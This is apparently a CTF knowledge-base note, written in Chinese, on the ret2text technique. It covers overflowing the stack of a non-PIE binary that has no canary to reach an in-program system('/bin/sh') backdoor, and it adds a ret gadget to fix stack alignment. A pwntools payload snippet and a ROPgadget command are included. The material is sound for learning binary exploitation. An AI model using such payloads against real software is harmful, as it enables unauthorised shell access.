---
title: ret2text — No PIE 栈溢出调后门
category: pwn
tags: [stack-overflow, ret2text, no-pie, no-canary, stack-alignment]
triggers: [ret2text, No PIE, No Canary, NX, secret_note, ROPgadget, 栈对齐, movaps]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/pwn/PWN-NoteService_ret2text.md]
---

## Summary

No PIE + No Canary + NX 启用场景，栈不可执行，需用 ret2text 跳转到程序自带的 `system("/bin/sh")` 后门。

## Key Points

- 用 `pwntools ELF().symbols` 列出所有函数，寻找后门
- 跳转后门函数时如果栈不对齐（8 mod 16），system() 内 movaps 会触发 SIGSEGV
- `ROPgadget --binary vuln | grep ": ret$"` 找 ret gadget

## Details

### 核心代码

```python
from pwn import *
elf = ELF('./vuln')
OFFSET = 0x40 + 8  # buf(64) + saved_rbp
SECRET_NOTE = 0x401196   # lea rdi, "/bin/sh"; call system
RET_GADGET = 0x40101a    # 栈对齐

payload = b'A' * OFFSET + p64(RET_GADGET) + p64(SECRET_NOTE)
```

## Connections

- Related: [[ret2win]]
- Related: [[heap-uaf-fastbin-overlap]]
